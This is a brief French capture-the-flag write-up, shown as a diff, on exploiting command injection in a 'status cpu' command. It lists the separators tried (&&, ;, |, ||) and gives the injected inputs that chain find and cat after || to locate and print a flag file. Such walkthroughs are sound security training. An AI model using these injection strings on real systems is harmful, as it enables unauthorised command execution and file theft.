@@ -1,0 +1,8 @@
+on test les commandes et voit que status cpu fontionne
+
+On test de nombreuses injections de commandes possibles avec && ; | ||
+On voit que status cpu || echo "test" renvoie test
+On a notre injection de commandes
+status cpu || echo $(find / -name "*.txt" 2>/dev/null) On localise le flag
+Et on l'affiche : 
+status cpu || echo $(cat /home/uart/flag.txt)
